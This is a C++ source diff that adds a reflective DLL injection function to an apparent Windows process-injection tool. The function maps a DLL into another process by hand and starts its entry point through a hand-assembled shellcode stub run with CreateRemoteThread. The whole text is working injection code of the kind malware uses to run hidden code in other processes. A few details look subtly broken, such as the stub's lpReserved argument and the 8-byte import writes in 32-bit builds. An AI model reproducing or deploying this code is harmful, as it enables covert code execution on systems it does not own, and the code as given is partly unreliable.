@@ -12,6 +12,13 @@
 
 #pragma comment(lib, "ntdll.lib")
 
+#ifndef LOAD_LIBRARY_AS_DATAFILE
+#define LOAD_LIBRARY_AS_DATAFILE 0x00000002
+#endif
+#ifndef LOAD_LIBRARY_AS_IMAGE
+#define LOAD_LIBRARY_AS_IMAGE 0x00000020
+#endif
+
 typedef NTSTATUS(NTAPI *pNtCreateThreadEx)(
     PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, LPVOID ObjectAttributes,
     HANDLE ProcessHandle, LPTHREAD_START_ROUTINE StartAddress, LPVOID Parameter,
@@ -535,5 +542,424 @@ BOOL Inject_SetWindowsHookEx(DWORD pid, const std::wstring &dllPath) {
   UnhookWindowsHookEx(hook);
   FreeLibrary(hDll);
 
+  return TRUE;
+}
+
+BOOL Inject_Reflective(DWORD pid, const std::wstring &dllPath) {
+  HANDLE hFile = CreateFileW(dllPath.c_str(), GENERIC_READ, FILE_SHARE_READ,
+                             NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+  if (hFile == INVALID_HANDLE_VALUE) {
+    PrintError("CreateFileW failed");
+    return FALSE;
+  }
+  LARGE_INTEGER fileSize{};
+  if (!GetFileSizeEx(hFile, &fileSize) || fileSize.QuadPart <= 0) {
+    PrintError("GetFileSizeEx failed");
+    CloseHandle(hFile);
+    return FALSE;
+  }
+  std::vector<BYTE> fileBytes(static_cast<size_t>(fileSize.QuadPart));
+  DWORD bytesRead = 0;
+  if (!ReadFile(hFile, fileBytes.data(), static_cast<DWORD>(fileBytes.size()),
+                &bytesRead, NULL) ||
+      bytesRead != fileBytes.size()) {
+    PrintError("ReadFile failed");
+    CloseHandle(hFile);
+    return FALSE;
+  }
+  CloseHandle(hFile);
+
+  if (fileBytes.size() < sizeof(IMAGE_DOS_HEADER)) {
+    std::cout << "[-] Invalid DLL: too small for DOS header." << std::endl;
+    return FALSE;
+  }
+  const auto *dosHeader =
+      reinterpret_cast<const IMAGE_DOS_HEADER *>(fileBytes.data());
+  if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
+    std::cout << "[-] Invalid DLL: bad DOS signature." << std::endl;
+    return FALSE;
+  }
+  if (dosHeader->e_lfanew <= 0 ||
+      static_cast<size_t>(dosHeader->e_lfanew) + sizeof(IMAGE_NT_HEADERS) >
+          fileBytes.size()) {
+    std::cout << "[-] Invalid DLL: bad NT header offset." << std::endl;
+    return FALSE;
+  }
+  const auto *ntHeaders = reinterpret_cast<const IMAGE_NT_HEADERS *>(
+      fileBytes.data() + dosHeader->e_lfanew);
+  if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
+    std::cout << "[-] Invalid DLL: bad NT signature." << std::endl;
+    return FALSE;
+  }
+#ifdef _M_X64
+  if (ntHeaders->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) {
+    std::cout << "[-] Architecture mismatch: x64 build requires an x64 DLL."
+              << std::endl;
+    return FALSE;
+  }
+#else
+  if (ntHeaders->FileHeader.Machine != IMAGE_FILE_MACHINE_I386) {
+    std::cout << "[-] Architecture mismatch: x86 build requires an x86 DLL."
+              << std::endl;
+    return FALSE;
+  }
+#endif
+
+  const DWORD imageSize = ntHeaders->OptionalHeader.SizeOfImage;
+  const DWORD sectionCount = ntHeaders->FileHeader.NumberOfSections;
+  const auto *sections = IMAGE_FIRST_SECTION(ntHeaders);
+
+  // Translates an RVA into the file buffer. LoadLibraryEx(AS_IMAGE) may
+  // return a handle offset from the real image base on some systems, so the
+  // PE is read deterministically from the raw file bytes instead.
+  const auto FileData = [&](DWORD Rva) -> const BYTE * {
+    if (Rva < ntHeaders->OptionalHeader.SizeOfHeaders)
+      return fileBytes.data() + Rva;
+    for (DWORD I = 0; I < sectionCount; ++I) {
+      const IMAGE_SECTION_HEADER &S = sections[I];
+      if (!S.SizeOfRawData || Rva < S.VirtualAddress)
+        continue;
+      const DWORD Offset = Rva - S.VirtualAddress;
+      if (Offset < S.SizeOfRawData)
+        return fileBytes.data() + S.PointerToRawData + Offset;
+    }
+    return nullptr;
+  };
+
+  HANDLE hProcess = OpenProcess(
+      PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION |
+          PROCESS_VM_WRITE | PROCESS_VM_READ,
+      FALSE, pid);
+  if (!hProcess) {
+    PrintError("OpenProcess failed");
+    return FALSE;
+  }
+
+  LPVOID pRemote = VirtualAllocEx(
+      hProcess, reinterpret_cast<LPVOID>(ntHeaders->OptionalHeader.ImageBase),
+      imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+  if (!pRemote)
+    pRemote = VirtualAllocEx(hProcess, NULL, imageSize,
+                             MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+  if (!pRemote) {
+    PrintError("VirtualAllocEx failed");
+    CloseHandle(hProcess);
+    return FALSE;
+  }
+
+  const ULONGLONG delta =
+      reinterpret_cast<ULONGLONG>(pRemote) -
+      static_cast<ULONGLONG>(ntHeaders->OptionalHeader.ImageBase);
+
+  SIZE_T written = 0;
+  auto WriteRemote = [&](const void *src, void *dst, SIZE_T size) -> BOOL {
+    return WriteProcessMemory(hProcess, dst, src, size, &written) &&
+           written == size;
+  };
+  auto Abort = [&]() -> BOOL {
+    VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
+    CloseHandle(hProcess);
+    std::cout << "[-] Reflective injection aborted." << std::endl;
+    return FALSE;
+  };
+
+  if (!WriteRemote(fileBytes.data(), pRemote,
+                   ntHeaders->OptionalHeader.SizeOfHeaders)) {
+    PrintError("WriteProcessMemory(headers) failed");
+    return Abort();
+  }
+  for (DWORD i = 0; i < sectionCount; ++i) {
+    const IMAGE_SECTION_HEADER &section = sections[i];
+    DWORD copySize = section.SizeOfRawData ? section.SizeOfRawData
+                                           : section.Misc.VirtualSize;
+    if (!copySize)
+      continue;
+    const DWORD endBound = i + 1 < sectionCount
+                               ? sections[i + 1].VirtualAddress
+                               : imageSize;
+    if (section.VirtualAddress + copySize > endBound)
+      copySize = endBound - section.VirtualAddress;
+    if (!WriteRemote(fileBytes.data() + section.PointerToRawData,
+                     static_cast<BYTE *>(pRemote) + section.VirtualAddress,
+                     copySize)) {
+      PrintError("WriteProcessMemory(section) failed");
+      return Abort();
+    }
+  }
+
+  const DWORD relocRva =
+      ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
+          .VirtualAddress;
+  const DWORD relocSize =
+      ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
+          .Size;
+  if (delta != 0 && relocRva && relocSize) {
+    const auto *relocBase = FileData(relocRva);
+    const auto *relocEnd = FileData(relocRva) + relocSize;
+    if (relocBase && relocEnd) {
+      const auto *block = reinterpret_cast<const IMAGE_BASE_RELOCATION *>(relocBase);
+      while (reinterpret_cast<const BYTE *>(block) + sizeof(IMAGE_BASE_RELOCATION) <=
+                 relocEnd &&
+             block->VirtualAddress) {
+        if (block->SizeOfBlock < sizeof(IMAGE_BASE_RELOCATION))
+          break;
+        const DWORD entryCount =
+            (block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
+        const auto *entries = reinterpret_cast<const WORD *>(block + 1);
+        const auto *pageData = FileData(block->VirtualAddress);
+        for (DWORD i = 0; i < entryCount; ++i) {
+          const WORD type = entries[i] >> 12;
+          const WORD offset = entries[i] & 0xFFF;
+          if (!pageData || block->VirtualAddress + offset >= imageSize)
+            continue;
+          const auto *shadowSlot = pageData + offset;
+          auto *remoteSlot = static_cast<BYTE *>(pRemote) +
+                             block->VirtualAddress + offset;
+#ifdef _M_X64
+          if (type == IMAGE_REL_BASED_DIR64) {
+            ULONGLONG value = 0;
+            memcpy(&value, shadowSlot, sizeof(value));
+            value += delta;
+            if (!WriteRemote(&value, remoteSlot, sizeof(value))) {
+              PrintError("WriteProcessMemory(reloc) failed");
+              return Abort();
+            }
+          }
+#else
+          if (type == IMAGE_REL_BASED_HIGHLOW) {
+            ULONG value = 0;
+            memcpy(&value, shadowSlot, sizeof(value));
+            value += static_cast<ULONG>(delta);
+            if (!WriteRemote(&value, remoteSlot, sizeof(value))) {
+              PrintError("WriteProcessMemory(reloc) failed");
+              return Abort();
+            }
+          }
+#endif
+        }
+        block = reinterpret_cast<const IMAGE_BASE_RELOCATION *>(
+            reinterpret_cast<const BYTE *>(block) + block->SizeOfBlock);
+      }
+    }
+  }
+
+  const DWORD importRva =
+      ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]
+          .VirtualAddress;
+  const DWORD importSize =
+      ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]
+          .Size;
+  if (importRva && importSize) {
+    const auto *importData = FileData(importRva);
+    if (importData) {
+      const auto *importEnd = importData + importSize;
+      const auto *desc =
+          reinterpret_cast<const IMAGE_IMPORT_DESCRIPTOR *>(importData);
+      while (reinterpret_cast<const BYTE *>(desc) + sizeof(IMAGE_IMPORT_DESCRIPTOR) <=
+                 importEnd &&
+             desc->Name != 0) {
+        const auto *moduleNameData = FileData(desc->Name);
+        if (!moduleNameData) {
+          std::cout << "[-] Invalid import module RVA: 0x" << std::hex
+                    << desc->Name << std::dec << std::endl;
+          return Abort();
+        }
+        const auto *moduleName =
+            reinterpret_cast<const char *>(moduleNameData);
+        HMODULE hImport = GetModuleHandleA(moduleName);
+        if (!hImport)
+          hImport = LoadLibraryA(moduleName);
+        if (!hImport) {
+          std::cout << "[-] Failed to resolve import module: " << moduleName
+                    << std::endl;
+          return Abort();
+        }
+        const DWORD thunkRva = desc->FirstThunk;
+        const DWORD origThunkRva = desc->OriginalFirstThunk
+                                       ? desc->OriginalFirstThunk
+                                       : thunkRva;
+        const auto *thunk =
+            reinterpret_cast<const IMAGE_THUNK_DATA *>(FileData(thunkRva));
+        const auto *origThunk = reinterpret_cast<const IMAGE_THUNK_DATA *>(
+            FileData(origThunkRva));
+        if (!thunk || !origThunk) {
+          std::cout << "[-] Invalid import thunk RVA: 0x" << std::hex
+                    << thunkRva << std::dec << std::endl;
+          return Abort();
+        }
+        DWORD iatIndex = 0;
+        while (origThunk->u1.AddressOfData != 0) {
+          LPVOID function = nullptr;
+#ifdef _M_X64
+          const bool byOrdinal =
+              (origThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64) != 0;
+#else
+          const bool byOrdinal =
+              IMAGE_SNAP_BY_ORDINAL(origThunk->u1.Ordinal) != 0;
+#endif
+          if (byOrdinal) {
+            function = GetProcAddress(
+                hImport, reinterpret_cast<LPCSTR>(origThunk->u1.Ordinal & 0xFFFF));
+          } else {
+            const auto *importByNameData = FileData(origThunk->u1.AddressOfData);
+            if (!importByNameData) {
+              std::cout << "[-] Invalid import name RVA: 0x" << std::hex
+                        << origThunk->u1.AddressOfData << std::dec << std::endl;
+              return Abort();
+            }
+            const auto *importByName =
+                reinterpret_cast<const IMAGE_IMPORT_BY_NAME *>(importByNameData);
+            function = GetProcAddress(hImport, importByName->Name);
+          }
+          if (!function) {
+            std::cout << "[-] Failed to resolve import: " << moduleName
+                      << std::endl;
+            return Abort();
+          }
+          const ULONGLONG remoteFunction = reinterpret_cast<ULONGLONG>(function);
+          auto *remoteIatSlot =
+              static_cast<BYTE *>(pRemote) + thunkRva +
+              iatIndex * sizeof(IMAGE_THUNK_DATA);
+          if (!WriteRemote(&remoteFunction, remoteIatSlot,
+                           sizeof(remoteFunction))) {
+            PrintError("WriteProcessMemory(import) failed");
+            return Abort();
+          }
+          ++thunk;
+          ++origThunk;
+          ++iatIndex;
+        }
+        ++desc;
+      }
+    }
+  }
+
+  for (DWORD i = 0; i < sectionCount; ++i) {
+    const IMAGE_SECTION_HEADER &section = sections[i];
+    const DWORD characteristics = section.Characteristics;
+    const bool executable = (characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
+    const bool readable = (characteristics & IMAGE_SCN_MEM_READ) != 0;
+    const bool writable = (characteristics & IMAGE_SCN_MEM_WRITE) != 0;
+    DWORD protection = PAGE_READONLY;
+    if (executable)
+      protection = writable ? PAGE_EXECUTE_READWRITE
+                            : (readable ? PAGE_EXECUTE_READ : PAGE_EXECUTE);
+    else if (writable)
+      protection = PAGE_READWRITE;
+    else if (!readable)
+      protection = PAGE_NOACCESS;
+    DWORD oldProtection = 0;
+    if (!VirtualProtectEx(hProcess,
+                          static_cast<BYTE *>(pRemote) + section.VirtualAddress,
+                          section.Misc.VirtualSize, protection,
+                          &oldProtection)) {
+      PrintError("VirtualProtectEx(section) failed");
+      return Abort();
+    }
+  }
+
+  if (!ntHeaders->OptionalHeader.AddressOfEntryPoint) {
+    PrintError("Module has no entry point");
+    return Abort();
+  }
+
+  // MSVC CRTs abort at startup if the module's __security_cookie still holds
+  // the file's default sentinel (meaning the image was not loaded by the OS
+  // loader). Randomize the sentinel in the remote image beforehand, as
+  // reflective loaders do, so DllMain actually runs.
+  const ULONGLONG CookieSentinel64 = 0x2B992DDFA232ULL;
+  const ULONGLONG CookieSentinel32 = 0xBB40E64EULL;
+  for (DWORD i = 0; i < sectionCount; ++i) {
+    const IMAGE_SECTION_HEADER &section = sections[i];
+    if (!(section.Characteristics & IMAGE_SCN_MEM_WRITE) ||
+        !(section.Characteristics & IMAGE_SCN_MEM_READ) ||
+        section.Characteristics & IMAGE_SCN_MEM_EXECUTE ||
+        !section.SizeOfRawData)
+      continue;
+    const DWORD RawSize =
+        section.SizeOfRawData <
+                static_cast<DWORD>(fileBytes.size()) - section.PointerToRawData
+            ? section.SizeOfRawData
+            : static_cast<DWORD>(fileBytes.size()) - section.PointerToRawData;
+    if (RawSize < sizeof(ULONGLONG))
+      continue;
+    const auto *Raw = fileBytes.data() + section.PointerToRawData;
+    for (DWORD Off = 0; Off + sizeof(ULONGLONG) <= RawSize; ++Off) {
+      ULONGLONG Value = 0;
+      memcpy(&Value, Raw + Off, sizeof(Value));
+      if (Value != CookieSentinel64 && Value != CookieSentinel32)
+        continue;
+      const ULONGLONG RandomCookie =
+          (static_cast<ULONGLONG>(GetTickCount64()) << 32) ^
+          (static_cast<ULONGLONG>(GetCurrentProcessId()) << 16) ^
+          (static_cast<ULONGLONG>(GetCurrentThreadId())) ^
+          static_cast<ULONGLONG>(reinterpret_cast<ULONG_PTR>(pRemote));
+      if (!WriteRemote(&RandomCookie,
+                       static_cast<BYTE *>(pRemote) + section.VirtualAddress +
+                           Off,
+                       sizeof(RandomCookie))) {
+        PrintError("WriteProcessMemory(security cookie) failed");
+        return Abort();
+      }
+      break;
+    }
+  }
+  auto *pEntry = static_cast<BYTE *>(pRemote) +
+                 ntHeaders->OptionalHeader.AddressOfEntryPoint;
+
+  // DllMain expects (hModule, fdwReason, lpReserved), but CreateRemoteThread
+  // only supplies one argument. Run a small stub in the target that calls the
+  // entry point with fdwReason = DLL_PROCESS_ATTACH.
+  const BYTE Stub32[] = {0x68, 0, 0, 0, 0, // push lpReserved (NULL)
+                         0x6A, 0x01,       // push fdwReason (1)
+                         0x68, 0, 0, 0, 0, // push hModule
+                         0xB8, 0, 0, 0, 0, // mov eax, entry
+                         0xFF, 0xD0,       // call eax
+                         0xC2, 0x0C, 0x00};// ret 0xC
+  const BYTE Stub64[] = {
+      0x48, 0xB9, 0, 0, 0, 0, 0, 0, 0, 0, // mov rcx, hModule
+      0xBA, 0x01, 0x00, 0x00, 0x00,       // mov edx, 1 (DLL_PROCESS_ATTACH)
+      0x4C, 0x8D, 0x05, 0x00, 0x00, 0x00, 0x00, // lea r8, [rip+0] (NULL)
+      0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0, // mov rax, entry
+      0x48, 0x83, 0xEC, 0x28,             // sub rsp, 28h
+      0xFF, 0xD0,                         // call rax
+      0x48, 0x83, 0xC4, 0x28,             // add rsp, 28h
+      0xC3};                              // ret
+#ifdef _M_X64
+  BYTE Stub[sizeof(Stub64)];
+  memcpy(Stub, Stub64, sizeof(Stub64));
+  const SIZE_T StubSize = sizeof(Stub64);
+  *reinterpret_cast<ULONGLONG *>(&Stub[2]) =
+      reinterpret_cast<ULONGLONG>(pRemote);
+  *reinterpret_cast<ULONGLONG *>(&Stub[24]) =
+      reinterpret_cast<ULONGLONG>(pEntry);
+#else
+  BYTE Stub[sizeof(Stub32)];
+  memcpy(Stub, Stub32, sizeof(Stub32));
+  const SIZE_T StubSize = sizeof(Stub32);
+  *reinterpret_cast<ULONG *>(&Stub[1]) = 0;
+  *reinterpret_cast<ULONG *>(&Stub[8]) =
+      reinterpret_cast<ULONG>(pRemote);
+  *reinterpret_cast<ULONG *>(&Stub[13]) =
+      reinterpret_cast<ULONG>(pEntry);
+#endif
+  LPVOID pStub = VirtualAllocEx(hProcess, NULL, StubSize, MEM_COMMIT | MEM_RESERVE,
+                                PAGE_EXECUTE_READWRITE);
+  if (!pStub || !WriteRemote(Stub, pStub, StubSize)) {
+    PrintError("VirtualAllocEx(stub) failed");
+    return Abort();
+  }
+  HANDLE hThread = CreateRemoteThread(
+      hProcess, NULL, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(pStub), NULL,
+      0, NULL);
+  if (!hThread) {
+    PrintError("CreateRemoteThread(entry) failed");
+    return Abort();
+  }
+  WaitForSingleObject(hThread, INFINITE);
+  CloseHandle(hThread);
+  CloseHandle(hProcess);
+  std::cout << "[+] Reflective injection succeeded: image at 0x" << std::hex
+            << pRemote << std::dec << " in PID " << pid << std::endl;
   return TRUE;
 }
